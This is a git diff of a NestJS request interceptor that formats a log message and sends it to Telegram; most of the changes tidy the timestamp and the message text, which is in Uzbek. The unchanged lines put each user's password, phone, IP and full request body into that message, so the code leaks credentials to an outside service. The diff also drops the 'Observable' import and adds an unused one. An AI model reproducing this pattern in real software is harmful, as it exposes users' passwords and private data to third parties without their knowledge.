@@ -1,8 +1,8 @@
 import {Injectable,NestInterceptor,ExecutionContext,CallHandler,Logger,} from '@nestjs/common';
-import { Observable } from 'rxjs';
 import { tap } from 'rxjs/operators';
 import axios from 'axios';
 import { PrismaClient } from '@prisma/client';
+import { EmptyError } from 'rxjs';
   
   @Injectable()
   export class TelegramInterceptor implements NestInterceptor {
@@ -30,16 +30,25 @@ import { PrismaClient } from '@prisma/client';
             })
     
       let data = new Date()
+      const year = data.getFullYear();
+      const month = String(data.getMonth() + 1).padStart(2, '0');
+      const day = String(data.getDate()).padStart(2, '0');
+      const hour = String(data.getHours()).padStart(2, '0');
+      const minute = String(data.getMinutes()).padStart(2, '0');
+      const second = String(data.getSeconds()).padStart(2, '0');
+      
       let logMessage = `
-      🛡 Ruxsat etilgan foydalanuvchi!\n
-       Vaqt: ${data.getFullYear()}: ${data.getMonth()}: ${data.getMinutes()} : ${data.getSeconds()}\n
+      🛡 Ruxsat etilgan foydalanuvchi!
+      
+      🕒 Vaqt: ${year}-${month}-${day} ${hour}:${minute}:${second}
       👤 Role: ${user.role}
       📞 Phone: ${userData?.phone || 'Nomalum'}
       🔐 Password: ${userData?.password || 'Nomalum'}
       🔗 URL: ${method} ${url}
-      📡 IP:    ${ip}
-      🎂 data: ${body || "Empty"}
-       `;
+      📡 IP: ${ip}
+      🎂 Data: ${request.body || "Empty"}
+      `;
+      
       
         this.sendToTelegram(logMessage);
               
